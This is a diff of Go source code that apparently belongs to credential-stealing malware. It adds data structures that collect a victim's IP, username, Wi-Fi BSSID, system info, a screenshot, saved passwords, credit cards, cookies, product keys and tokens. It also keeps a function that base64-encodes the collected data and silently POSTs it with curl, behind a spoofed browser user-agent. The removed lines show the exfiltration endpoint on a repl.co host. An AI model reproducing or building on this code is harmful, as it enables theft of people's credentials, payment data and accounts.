@@ -30,6 +30,27 @@ var (
 	HEADERS [999]string
 )
 
+type geninf struct {
+	Ip         string  `json:"ip"`
+	Username   string  `json:"username"`
+	BSSID      string  `json:"bssid"`
+	Info       SysInfo `json:"info"`
+	Screenshot string  `json:"screenshot"` // This should be an actual Base64 encoding of the file
+}
+
+type dumps struct {
+	Passwords   []PASSWD   `json:"passwords"`
+	CreditCards []CCARD    `json:"credit-cards"`
+	Cookies     []COOKIE   `json:"cookies"`
+	ProductKey  PRODUCTKEY `json:"product-key"`
+	Tokens      []string   `json:"tokens"`
+}
+
+type OUTPUT struct {
+	GeneralInfo geninf `json:"general-info"`
+	Dumps       dumps  `json:"dumps"`
+}
+
 type SysInfo struct {
 	Hostname string
 	Platform string
@@ -47,17 +68,6 @@ func SendRequest(body string) {
 	var encoded_payload string = strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(body)), "=", "")
 
 	exec.Command("curl",
-		//"-H", "Host: liveton.studio7.repl.co",
-		//"-H", "upgrade-insecure-request: 1",
-		//"-H", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
-		//"-H", "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-		//"-H", "sec-gpc: 1",
-		//"-H", "accept-language: en-US,en;q=0.5",
-		//"-H", "sec-fetch-site: none",
-		//"-H", "sec-fetch-mode: navigate",
-		//"-H", "sec-fetch-user: ?1",
-		//"-H", "sec-fetch-dest: document",
-		//"--compressed",
 		"--location",
 		"--request",
 		"POST",
@@ -65,21 +75,6 @@ func SendRequest(body string) {
 		"--header", "Content-Type: application/x-www-form-urlencoded",
 		"--header", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
 		"--data-urlencode", "id="+encoded_payload).Start()
-
-	//	this is the post version // you should
-
-	/*
-		curl --location --request POST 'https://liveton.studio7.repl.co/go' \
-		--header 'Content-Type: application/x-www-form-urlencoded' \
-		--data-urlencode 'id=SHITGOESHERE'
-	*/
-
-	//exec.Command("curl",
-	//	"--location",
-	//	"--request", "POST",
-	//	"'https://liveton.studio7.repl.co/go'",
-	//	"-H", "'Content-Type: application/x-www-form-urlencoded'",
-	//	"--data-urlencode", "'id=" + encoded_payload + "'")
 
 }
 
